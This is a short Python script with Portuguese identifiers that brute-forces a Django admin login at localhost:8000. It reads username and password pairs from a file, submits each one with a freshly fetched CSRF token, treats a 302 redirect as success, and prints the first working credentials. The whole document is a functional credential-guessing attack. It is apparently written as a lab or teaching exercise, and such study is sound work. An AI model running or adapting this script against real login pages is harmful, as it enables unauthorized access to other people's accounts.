import requests


def usuario_e_senha_eh_valido(usuario, senha):
    sessao = requests.Session()
    pagina_login = sessao.get('http://localhost:8000/admin/login')
    my_csrf_token = pagina_login.cookies['csrftoken']

    data={'username': usuario,
          'password': senha,
          'csrfmiddlewaretoken': my_csrf_token}

    pagina_tentativa = sessao.post(
        'http://localhost:8000/admin/login/',
        data=data,
        allow_redirects=False)

    if pagina_tentativa.status_code == 302:
        return True
    else:
        return False


arquivo_obj = open('arquivo_de_senhas.txt', 'r', encoding='utf-8')

for indice, line in enumerate(arquivo_obj.readlines()):
    u, s = line.replace('\n', '').split(',')
    if usuario_e_senha_eh_valido(usuario=u, senha=s) is True:
        print('achei o usuario correto:', u, s)
        break
    else:
        print('não foi dessa vez...', str(indice))
